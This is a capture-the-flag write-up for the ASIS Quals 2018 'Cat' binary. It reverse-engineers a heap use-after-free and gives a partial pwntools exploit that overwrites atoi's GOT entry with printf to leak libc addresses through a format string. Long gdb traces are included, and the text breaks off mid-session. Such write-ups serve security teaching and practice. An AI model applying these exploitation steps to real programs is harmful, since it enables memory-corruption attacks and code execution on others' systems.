# Cat
This is a `67` point challenge from ASIS Quals 2018. This writeup is based off of `https://kileak.github.io/ctf/2018/asisquals18-cat/`.

## Reverse Engineering

#### Main Function:

```
  while ( menut_loop_int )
  {
    print_menu();
    printf("which command?\n> ");
    read(0, &menu_option, 4uLL);
    switch ( atoi(&menu_option) )
    {
      case 1:
        create_pet_record();
        break;
      case 2:
        edit_pet_record();
        break;
      case 3:
        print_record();
        break;
      case 4:
        print_all_records();
        break;
      case 5:
        delete_record();
        break;
      case 6:
        menut_loop_int = 0;
        break;
      default:
        puts("Invalid command! (=+_+=)");
        break;
    }
  }
```
Looking at the main function, we can see that it essentially just loops itself. Each iteration it prompts the user for 4 bytes of input, which it then converts into an interger. Proceeding that it runs a swithc statement which most of them will run a sub routine (excpet for 6 which will exit the loop). 

#### Create Pet Record:
```
  memory_count = 0xFFFFFFFF;
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&scanned_in_memory + i) )
    {
      memory_count = i;
      break;
    }
  }
  if ( memory_count == 0xFFFFFFFF )
  {
    puts("records is full! (=+_+=)");
    result = 0LL;
  }
  else
  {
    *(&scanned_in_memory + memory_count) = malloc(0x18uLL);
    v1 = (void **)*(&scanned_in_memory + memory_count);
    *v1 = malloc(0x17uLL);
    v2 = (__int64)*(&scanned_in_memory + memory_count);
    *(_QWORD *)(v2 + 8) = malloc(0x17uLL);
    printf("What's the pet's name?\n> ");
    *(_BYTE *)((signed int)read(0, *(void **)*(&scanned_in_memory + memory_count), 0x16uLL)
             - 1LL
             + *(_QWORD *)*(&scanned_in_memory + memory_count)) = 0;
    printf("What's the pet's kind?\n> ");
    *(_BYTE *)((signed int)read(0, *((void **)*(&scanned_in_memory + memory_count) + 1), 0x16uLL)
             - 1LL
             + *((_QWORD *)*(&scanned_in_memory + memory_count) + 1)) = 0;
    printf("How old?\n> ");
    read(0, &buf, 4uLL);
    v3 = (__int64)*(&scanned_in_memory + memory_count);
    *(_QWORD *)(v3 + 16) = atoi(&buf);
    printf("create record id:%d\n", (unsigned int)memory_count);
    result = 0LL;
  }
```

So looking at this, we can see that it creates a custom struct to store the pet information in the heap (the exact structe is described below). We can see that the structs are storred in an array in the bss as a global variable at the address `0x6020a0` (that address doesn't change). It doesn't look like there is a bug here.

##### Pet Heap Struct

```
24 bytes in size:
8 bytes: char pointer to pets name (0x17 byte heap space)
8 bytes: char pointer to pets kind (0x17 byte heap space)
8 byte: integer which holds pet's age
```

#### Edit Record:

```
  id = verify_id();
  if ( id == 0xFFFFFFFF )
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
  else if ( *(&scanned_in_memory + id) )
  {
    if ( !::ptr )
    {
      ::ptr = malloc(0x18uLL);
      v1 = (void **)::ptr;
      *v1 = malloc(0x17uLL);
      v2 = ::ptr;
      v2[1] = malloc(0x17uLL);
    }
    printf("What's the pet's name?\n> ");
    v3 = *(_QWORD *)::ptr;
    v4 = read(0, *(void **)::ptr, 0x16uLL);
    *(_BYTE *)(v4 - 1LL + *(_QWORD *)::ptr) = 0;
    printf("What's the pet's kind?\n> ", v3);
    v5 = read(0, *((void **)::ptr + 1), 0x16uLL);
    *(_BYTE *)(v5 - 1LL + *((_QWORD *)::ptr + 1)) = 0;
    printf("How old?\n> ");
    read(0, &buf, 4uLL);
    v6 = ::ptr;
    v6[2] = atoi(&buf);
    printf("Would you modify? (y)/n> ", &buf);
    read(0, &buf, 4uLL);
    if ( buf == 'n' )
    {
      ptr = *(void **)::ptr;
      v8 = (void *)*((_QWORD *)::ptr + 1);
      free(::ptr);
      free(ptr);
      free(v8);
      result = 0LL;
    }
    else
    {
      free(*(void **)*(&scanned_in_memory + id));
      free(*((void **)*(&scanned_in_memory + id) + 1));
      free(*(&scanned_in_memory + id));
      *(&scanned_in_memory + id) = ::ptr;
      ::ptr = 0LL;
      printf("edit id %d\n", (unsigned int)id);
      result = 0LL;
    }
  }
  else
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
```

Starting off we have another global variable stored in the bss at the address `0x6020f0` which is `ptr`. Continuing we see that it prompts and checks to ensure that it is vald with `verify_id`. Proceeding that it `ptr` is equal to zero, it will allocate a new pet structure and store the pointer to it in `ptr`. It then prompts the user for the corresponding values for thos. Proceeding that it prompts the user if they want to modify the pet record. If the answer is anything but `n`, it will free the allocated space for the old pet record, replace the pointer located in the `scanned_in_memory` array with that of the pointer in `ptr`, then zero out `ptr`. However if they select `n`, it will free the space allocated for the three variable stored in the `ptr` heap structure however it doesn't zero out the pointer in `ptr`. This is a use after free bug. 


#### Print Record:
```
__int64 print_record()
{
  __int64 result; // rax@2
  int id; // [sp+Ch] [bp-4h]@1

  id = verify_id();
  if ( id == 0xFFFFFFFF )
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
  else if ( *(&scanned_in_memory + id) )
  {
    printf(
      "name: %s\nkind: %s\nold: %lu\n",
      *(_QWORD *)*(&scanned_in_memory + id),
      *((_QWORD *)*(&scanned_in_memory + id) + 1),
      *((_QWORD *)*(&scanned_in_memory + id) + 2));
    printf("print id %d\n", (unsigned int)id);
    result = 0LL;
  }
  else
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
  return result;
}
```

This function we can see is it prompts for an id (does so and checks it with the `verify_id` function). Proceeding that we can see it prints out the pet's name, kind, and age. Doesn't look like we have a bug here.

#### Print all Records:
```
__int64 print_all_records()
{
  signed int i; // [sp+Ch] [bp-4h]@1

  for ( i = 0; i <= 9; ++i )
  {
    if ( *(&scanned_in_memory + i) )
    {
      puts("---");
      printf(
        "id: %d\nname: %s\nkind: %s\nold: %lu\n",
        (unsigned int)i,
        *(_QWORD *)*(&scanned_in_memory + i),
        *((_QWORD *)*(&scanned_in_memory + i) + 1),
        *((_QWORD *)*(&scanned_in_memory + i) + 2));
    }
  }
  puts("print all: ");
  return 0LL;
}
```

This is pretty much the print function, except it just iterates through all of the pet structures.

#### Delete Record

```
__int64 delete_record()
{
  __int64 result; // rax@2
  int id; // [sp+Ch] [bp-4h]@1

  id = verify_id();
  if ( id == 0xFFFFFFFF )
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
  else if ( *(&scanned_in_memory + id) )
  {
    free(*(void **)*(&scanned_in_memory + id));
    free(*((void **)*(&scanned_in_memory + id) + 1));
    free(*(&scanned_in_memory + id));
    *(&scanned_in_memory + id) = 0LL;
    printf("delete id %d\n", (unsigned int)id);
    result = 0LL;
  }
  else
  {
    puts("Invalid id! (=+_+=)");
    result = 0LL;
  }
  return result;
}
```

Looking at this function, we can first see that it prompts (and checks) for an id using `verify_id`. Proceeding that it will free the allocated heap space for that record, and zero out the pointer stored in `scanned_in_memory` for that record.

## Exploiting

So we have a use after free bug in the edit feature. Let's try to allocate space after we free the space, so we see how the space lines up. First I set a breakpoint for the compare statement in the edit feature to see if they want to modify the record, so we can look at the `ptr` pet record:

```
gdb-peda$ b *0x400d26
Breakpoint 1 at 0x400d26
gdb-peda$ r
Starting program: /Hackery/asis18q/rev/cat/cat 

$$$$$$$\             $$\           $$$$$$$\                      $$\             $$\                         
$$  __$$\            $$ |          $$  __$$\                     \__|            $$ |                        
$$ |  $$ | $$$$$$\ $$$$$$\         $$ |  $$ | $$$$$$\   $$$$$$\  $$\  $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  
$$$$$$$  |$$  __$$\\_$$  _|        $$$$$$$  |$$  __$$\ $$  __$$\ $$ |$$  _____|\_$$  _|  $$  __$$\ $$  __$$\ 
$$  ____/ $$$$$$$$ | $$ |          $$  __$$< $$$$$$$$ |$$ /  $$ |$$ |\$$$$$$\    $$ |    $$$$$$$$ |$$ |  \__|
$$ |      $$   ____| $$ |$$\       $$ |  $$ |$$   ____|$$ |  $$ |$$ | \____$$\   $$ |$$\ $$   ____|$$ |      
$$ |      \$$$$$$$\  \$$$$  |      $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |$$$$$$$  |  \$$$$  |\$$$$$$$\ $$ |      
\__|       \_______|  \____/       \__|  \__| \_______| \____$$ |\__|\_______/    \____/  \_______|\__|      
                                                       $$\   $$ |                                            
                                                       \$$$$$$  |                                            
                                                        \______/                                             

------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> 1
What's the pet's name?
> guyinatuxedo
What's the pet's kind?
> 15935728
How old?
> 25
create record id:0
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> 2
which id?
> 0
What's the pet's name?
> lefteye
What's the pet's kind?
> righteye
How old?
> 95
Would you modify? (y)/n> n

[----------------------------------registers-----------------------------------]
RAX: 0x6e ('n')
RBX: 0x603070 --> 0x603090 --> 0x6579657466656c ('lefteye')
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7fffffffde00 --> 0x7fffff0a0a6e 
RDI: 0x0 
RBP: 0x7fffffffde30 --> 0x7fffffffde70 --> 0x401120 (push   r15)
RSP: 0x7fffffffdde0 --> 0x5000030 
RIP: 0x400d26 (cmp    al,0x6e)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x19 
R10: 0x7ffff7b84f60 --> 0x100000000 
R11: 0x246 
R12: 0x400750 (xor    ebp,ebp)
R13: 0x7fffffffdf50 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400d18:	mov    edi,0x0
   0x400d1d:	call   0x4006f0 <read@plt>
   0x400d22:	movzx  eax,BYTE PTR [rbp-0x30]
=> 0x400d26:	cmp    al,0x6e
   0x400d28:	jne    0x400d75
   0x400d2a:	mov    rax,QWORD PTR [rip+0x2013bf]        # 0x6020f0
   0x400d31:	mov    rax,QWORD PTR [rax]
   0x400d34:	mov    QWORD PTR [rbp-0x40],rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdde0 --> 0x5000030 
0008| 0x7fffffffdde8 --> 0x900000000 ('')
0016| 0x7fffffffddf0 --> 0x401668 ('-' <repeats 48 times>)
0024| 0x7fffffffddf8 --> 0x0 
0032| 0x7fffffffde00 --> 0x7fffff0a0a6e 
0040| 0x7fffffffde08 --> 0x400750 (xor    ebp,ebp)
0048| 0x7fffffffde10 --> 0x7fffffffdf50 --> 0x1 
0056| 0x7fffffffde18 --> 0x8f96fc56bdd0000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400d26 in ?? ()
gdb-peda$ x/x 0x6020f0
0x6020f0:	0x0000000000603070
gdb-peda$ x/x 0x603070
0x603070:	0x0000000000603090
gdb-peda$ x/3g 0x603070
0x603070:	0x0000000000603090	0x00000000006030b0
0x603080:	0x000000000000005f
gdb-peda$ x/s 0x603090
0x603090:	"lefteye"
gdb-peda$ x/s 0x6030b0
0x6030b0:	"righteye"
```

So we can see the structure with the data we would expect to see. Let's now make a new pet record, and see where the three new heap spaces are (setting a breakpoint for the corresponding read calls for the heap space):

```
gdb-peda$ b *0x400a7e
Breakpoint 2 at 0x400a7e
gdb-peda$ b *0x400ad3
Breakpoint 3 at 0x400ad3
gdb-peda$ b *0x400b1c
Breakpoint 4 at 0x400b1c
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> 1
What's the pet's name?
> 
[----------------------------------registers-----------------------------------]
RAX: 0x603090 --> 0x603060 --> 0x0 
RBX: 0x6030b0 --> 0x603090 --> 0x603060 --> 0x0 
RCX: 0x19 
RDX: 0x16 
RSI: 0x603090 --> 0x603060 --> 0x0 
RDI: 0x0 
RBP: 0x7fffffffde30 --> 0x7fffffffde70 --> 0x401120 (push   r15)
RSP: 0x7fffffffddf0 --> 0x100401668 
RIP: 0x400a7e (call   0x4006f0 <read@plt>)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x19 
R10: 0x7ffff7b84f60 --> 0x100000000 
R11: 0x246 
R12: 0x400750 (xor    ebp,ebp)
R13: 0x7fffffffdf50 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400a71:	mov    edx,0x16
   0x400a76:	mov    rsi,rax
   0x400a79:	mov    edi,0x0
=> 0x400a7e:	call   0x4006f0 <read@plt>
   0x400a83:	mov    DWORD PTR [rbp-0x34],eax
   0x400a86:	mov    eax,DWORD PTR [rbp-0x3c]
   0x400a89:	cdqe   
   0x400a8b:	mov    rax,QWORD PTR [rax*8+0x6020a0]
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x603090 --> 0x603060 --> 0x0 
arg[2]: 0x16 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddf0 --> 0x100401668 
0008| 0x7fffffffddf8 --> 0x1 
0016| 0x7fffffffde00 --> 0x7fffffffde70 --> 0x401120 (push   r15)
0024| 0x7fffffffde08 --> 0x400750 (xor    ebp,ebp)
0032| 0x7fffffffde10 --> 0x7fffffffdf50 --> 0x1 
0040| 0x7fffffffde18 --> 0x8f96fc56bdd0000 
0048| 0x7fffffffde20 --> 0x0 
0056| 0x7fffffffde28 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0000000000400a7e in ?? ()
gdb-peda$ c
Continuing.
horus
What's the pet's kind?
> 





[----------------------------------registers-----------------------------------]
RAX: 0x603070 --> 0x0 
RBX: 0x6030b0 --> 0x603090 --> 0x7375726f68 ('horus')
RCX: 0x19 
RDX: 0x16 
RSI: 0x603070 --> 0x0 
RDI: 0x0 
RBP: 0x7fffffffde30 --> 0x7fffffffde70 --> 0x401120 (push   r15)
RSP: 0x7fffffffddf0 --> 0x100401668 
RIP: 0x400ad3 (call   0x4006f0 <read@plt>)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x19 
R10: 0x7ffff7b84f60 --> 0x100000000 
R11: 0x246 
R12: 0x400750 (xor    ebp,ebp)
R13: 0x7fffffffdf50 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ac6:	mov    edx,0x16
   0x400acb:	mov    rsi,rax
   0x400ace:	mov    edi,0x0
=> 0x400ad3:	call   0x4006f0 <read@plt>
   0x400ad8:	mov    DWORD PTR [rbp-0x34],eax
   0x400adb:	mov    eax,DWORD PTR [rbp-0x3c]
   0x400ade:	cdqe   
   0x400ae0:	mov    rax,QWORD PTR [rax*8+0x6020a0]
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x603070 --> 0x0 
arg[2]: 0x16 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddf0 --> 0x100401668 
0008| 0x7fffffffddf8 --> 0x600000001 
0016| 0x7fffffffde00 --> 0x7fffffffde70 --> 0x401120 (push   r15)
0024| 0x7fffffffde08 --> 0x400750 (xor    ebp,ebp)
0032| 0x7fffffffde10 --> 0x7fffffffdf50 --> 0x1 
0040| 0x7fffffffde18 --> 0x8f96fc56bdd0000 
0048| 0x7fffffffde20 --> 0x0 
0056| 0x7fffffffde28 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 3, 0x0000000000400ad3 in ?? ()
gdb-peda$ x/x 0x6020f0
0x6020f0:	0x0000000000603070
```

So here we can see that the heap space that is allocated is directly overlapping with the `ptr` structure. So when we start inputting data, we will start overwriting the struct in `ptr` starting with the pointer to the pet's name:

```
gdb-peda$ c
Continuing.
eye
How old?
> 








[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffde00 --> 0x7fffffffde70 --> 0x401120 (push   r15)
RBX: 0x6030b0 --> 0x603090 --> 0x7375726f68 ('horus')
RCX: 0xb ('\x0b')
RDX: 0x4 
RSI: 0x7fffffffde00 --> 0x7fffffffde70 --> 0x401120 (push   r15)
RDI: 0x0 
RBP: 0x7fffffffde30 --> 0x7fffffffde70 --> 0x401120 (push   r15)
RSP: 0x7fffffffddf0 --> 0x100401668 
RIP: 0x400b1c (call   0x4006f0 <read@plt>)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0xb ('\x0b')
R10: 0x7ffff7b84f60 --> 0x100000000 
R11: 0x246 
R12: 0x400750 (xor    ebp,ebp)
R13: 0x7fffffffdf50 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400b0f:	mov    edx,0x4
   0x400b14:	mov    rsi,rax
   0x400b17:	mov    edi,0x0
=> 0x400b1c:	call   0x4006f0 <read@plt>
   0x400b21:	mov    eax,DWORD PTR [rbp-0x3c]
   0x400b24:	cdqe   
   0x400b26:	mov    rbx,QWORD PTR [rax*8+0x6020a0]
   0x400b2e:	lea    rax,[rbp-0x30]
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x7fffffffde00 --> 0x7fffffffde70 --> 0x401120 (push   r15)
arg[2]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddf0 --> 0x100401668 
0008| 0x7fffffffddf8 --> 0x400000001 
0016| 0x7fffffffde00 --> 0x7fffffffde70 --> 0x401120 (push   r15)
0024| 0x7fffffffde08 --> 0x400750 (xor    ebp,ebp)
0032| 0x7fffffffde10 --> 0x7fffffffdf50 --> 0x1 
0040| 0x7fffffffde18 --> 0x8f96fc56bdd0000 
0048| 0x7fffffffde20 --> 0x0 
0056| 0x7fffffffde28 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 4, 0x0000000000400b1c in ?? ()
gdb-peda$ 78
Undefined command: "78".  Try "help".
gdb-peda$ c
Continuing.
78
create record id:1
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> 2
which id?
> 1
What's the pet's name?
> break

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x657963 ('cye')
RBX: 0x0 
RCX: 0xffffffffffffff98 
RDX: 0xfffffffffffffffe 
RSI: 0x657965 ('eye')
RDI: 0x0 
RBP: 0x7fffffffde30 --> 0x7fffffffde70 --> 0x401120 (push   r15)
RSP: 0x7fffffffdde0 --> 0x5000030 
RIP: 0x400c72 (mov    BYTE PTR [rax],0x0)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x19 
R10: 0x7ffff7b84f60 --> 0x100000000 
R11: 0x246 
R12: 0x400750 (xor    ebp,ebp)
R13: 0x7fffffffdf50 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400c68:	movsxd rdx,edx
   0x400c6b:	sub    rdx,0x1
   0x400c6f:	add    rax,rdx
=> 0x400c72:	mov    BYTE PTR [rax],0x0
   0x400c75:	mov    edi,0x401744
   0x400c7a:	mov    eax,0x0
   0x400c7f:	call   0x4006d0 <printf@plt>
   0x400c84:	mov    rax,QWORD PTR [rip+0x201465]        # 0x6020f0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdde0 --> 0x5000030 
0008| 0x7fffffffdde8 --> 0xffffffff00000001 
0016| 0x7fffffffddf0 --> 0x401668 ('-' <repeats 48 times>)
0024| 0x7fffffffddf8 --> 0x0 
0032| 0x7fffffffde00 --> 0x7fffffffde70 --> 0x401120 (push   r15)
0040| 0x7fffffffde08 --> 0x400750 (xor    ebp,ebp)
0048| 0x7fffffffde10 --> 0x7fffffffdf50 --> 0x1 
0056| 0x7fffffffde18 --> 0x8f96fc56bdd0000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400c72 in ?? ()
gdb-peda$ break
Breakpoint 5 at 0x400c72
gdb-peda$ x/x $rax
0x657963:	Cannot access memory at address 0x657963
gdb-peda$ p $rax
$1 = 0x657963
```

So you can see, with the bug we caused a crash. That is because the stale pointer stored in `ptr` was not reset when we edited a pet since it already existed. In addition to that we wrote over the spot where there should be a pointer with `eye`, and it tried to write to `eye` (last character was modified by 2 bits). With this bug we effictively have a write what where.

#### Infoleak

Since this binary most likely has ASLR enabled, we will have to leak an address in order to defeat it. We can do this by overwriting the got address of `atoi` with the plt address `printf` so whenever `atoi` is called, it will really call `printf`. Since atoi has a single char array passed to it as an argument, we can use this as a format string bug to leak values. Below is a patial exploit that I have which will write over `atoi`, and we will do the format string exploits by hand to see what we can leak. Here is the partial exploit we will use for this (some sections of this partial exploit are explained below):
```
from pwn import *

target = process('./cat')
gdb.attach(target)

printf_plt = p64(0x4006d0)
atoi_got = p64(0x602068)

def create_pet(name, pet_type, age):
	target.sendline('1')
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')

def edit_pet(index, name, pet_type, age, modify):
	target.sendline('2')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')
	target.sendline(modify)
	target.recvuntil('>')

def print_pet(index):
	target.sendline('3')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	name = target.recvline()
	kind = target.recvline()
	age = target.recvline()
	print "name: " + name
	print "kind: " + kind
	print "age: " + age
	target.recvuntil('>')


create_pet('reverent', 'drummer', '16')
edit_pet('0', '789654123', '95175382', '16', 'n')
create_pet('reverent', atoi_got + p64(0x602100) + p64(0x602300), '16')
edit_pet('0', printf_plt, '15935728', '16', 'y')
target.recvuntil('>')
target.sendline('%3$p')
target.recvuntil('>')
leak = target.recvline()
leak = leak.replace("Invalid command! (=+_+=)\n", "")
print "The leak is: " + leak

target.interactive()
```

here is the script running, followed by the manual format string attacks to leak values off of the stack (the reason why we use the `%p` format is to leak all 8 bytes):
```
$	python leak.py 
[+] Starting local process './cat': pid 7654
[*] running in new terminal: /usr/bin/gdb -q  "/Hackery/asis18q/rev/cat/cat" 7654
[+] Waiting for debugger: Done
[*] Switching to interactive mode
 16
2�Would you modify? (y)/n> edit id 0
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> $ %1$p
0x7ffc32a53210Invalid command! (=+_+=)
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> 
1$p---
id: 0
name: �@
kind: 15935728
old: 6
---
id: 1
name: reverent
kind: h `
old: 0
print all: 
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> $ %2$p
0x4which id?
> 

name: reverent
kind: h `
old: 0
print id 1
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> $ %3$p
0x7fe4597eb890Invalid command! (=+_+=)
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> 
3$p---
id: 0
name: �@
kind: 15935728
old: 6
---
id: 1
name: reverent
kind: h `
old: 0
print all: 
```

Here is the gdb analysis of those leaked addresses:
```
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
^C 
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7fe4597eb890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7ffc32a53210 --> 0x7024350a ('\n5$p')
RDI: 0x0 
RBP: 0x7ffc32a53230 --> 0x401120 (push   r15)
RSP: 0x7ffc32a531f8 --> 0x401085 (lea    rax,[rbp-0x20])
RIP: 0x7fe4597eb890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7fe459cb8700 (0x00007fe459cb8700)
R9 : 0x11 
R10: 0x75 ('u')
R11: 0x246 
R12: 0x400750 (xor    ebp,ebp)
R13: 0x7ffc32a53310 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7fe4597eb887 <read+7>:	jne    0x7fe4597eb899 <read+25>
   0x7fe4597eb889 <__read_nocancel>:	mov    eax,0x0
   0x7fe4597eb88e <__read_nocancel+5>:	syscall 
=> 0x7fe4597eb890 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7fe4597eb896 <__read_nocancel+13>:	jae    0x7fe4597eb8c9 <read+73>
   0x7fe4597eb898 <__read_nocancel+15>:	ret    
   0x7fe4597eb899 <read+25>:	sub    rsp,0x8
   0x7fe4597eb89d <read+29>:	
    call   0x7fe459809d70 <__libc_enable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7ffc32a531f8 --> 0x401085 (lea    rax,[rbp-0x20])
0008| 0x7ffc32a53200 --> 0x0 
0016| 0x7ffc32a53208 --> 0x400000001 
0024| 0x7ffc32a53210 --> 0x7024350a ('\n5$p')
0032| 0x7ffc32a53218 --> 0x400750 (xor    ebp,ebp)
0040| 0x7ffc32a53220 --> 0x7ffc32a53310 --> 0x1 
0048| 0x7ffc32a53228 --> 0x7b7ce6b59543e100 
0056| 0x7ffc32a53230 --> 0x401120 (push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007fe4597eb890 in __read_nocancel ()
    at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ x/x 0x7ffc32a53210
0x7ffc32a53210:	0x000000007024350a
gdb-peda$ find 0x7ffc32a53210
Searching for '0x7ffc32a53210' in: None ranges
Found 3 results, display max 3 items:
[stack] : 0x7ffc32a4ff30 --> 0x7ffc32a53210 --> 0x7024350a ('\n5$p')
[stack] : 0x7ffc32a50020 --> 0x7ffc32a53210 --> 0x7024350a ('\n5$p')
[stack] : 0x7ffc32a504b0 --> 0x7ffc32a53210 --> 0x7024350a ('\n5$p')
gdb-peda$ x/x 0x7fe4597eb890
0x7fe4597eb890 <__read_nocancel+7>:	0x3173fffff0013d48
```

So we can see that at offset 3, we have a libc address. We can figure out it's offset from system with gdb and python:

First grab the addres of both in gdb:
```
gdb-peda$ r
Starting program: /Hackery/asis18q/rev/cat/cat 

$$$$$$$\             $$\           $$$$$$$\                      $$\             $$\                         
$$  __$$\            $$ |          $$  __$$\                     \__|            $$ |                        
$$ |  $$ | $$$$$$\ $$$$$$\         $$ |  $$ | $$$$$$\   $$$$$$\  $$\  $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  
$$$$$$$  |$$  __$$\\_$$  _|        $$$$$$$  |$$  __$$\ $$  __$$\ $$ |$$  _____|\_$$  _|  $$  __$$\ $$  __$$\ 
$$  ____/ $$$$$$$$ | $$ |          $$  __$$< $$$$$$$$ |$$ /  $$ |$$ |\$$$$$$\    $$ |    $$$$$$$$ |$$ |  \__|
$$ |      $$   ____| $$ |$$\       $$ |  $$ |$$   ____|$$ |  $$ |$$ | \____$$\   $$ |$$\ $$   ____|$$ |      
$$ |      \$$$$$$$\  \$$$$  |      $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |$$$$$$$  |  \$$$$  |\$$$$$$$\ $$ |      
\__|       \_______|  \____/       \__|  \__| \_______| \____$$ |\__|\_______/    \____/  \_______|\__|      
                                                       $$\   $$ |                                            
                                                       \$$$$$$  |                                            
                                                        \______/                                             

------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
> ^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7fffffffdf40 --> 0x401120 (push   r15)
RDI: 0x0 
RBP: 0x7fffffffdf60 --> 0x401120 (push   r15)
RSP: 0x7fffffffdf28 --> 0x401085 (lea    rax,[rbp-0x20])
RIP: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x11 
R10: 0x37b 
R11: 0x246 
R12: 0x400750 (xor    ebp,ebp)
R13: 0x7fffffffe040 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7b08887 <read+7>:	jne    0x7ffff7b08899 <read+25>
   0x7ffff7b08889 <__read_nocancel>:	mov    eax,0x0
   0x7ffff7b0888e <__read_nocancel+5>:	syscall 
=> 0x7ffff7b08890 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7ffff7b08896 <__read_nocancel+13>:	jae    0x7ffff7b088c9 <read+73>
   0x7ffff7b08898 <__read_nocancel+15>:	ret    
   0x7ffff7b08899 <read+25>:	sub    rsp,0x8
   0x7ffff7b0889d <read+29>:	call   0x7ffff7b26d70 <__libc_enable_asynccancel>
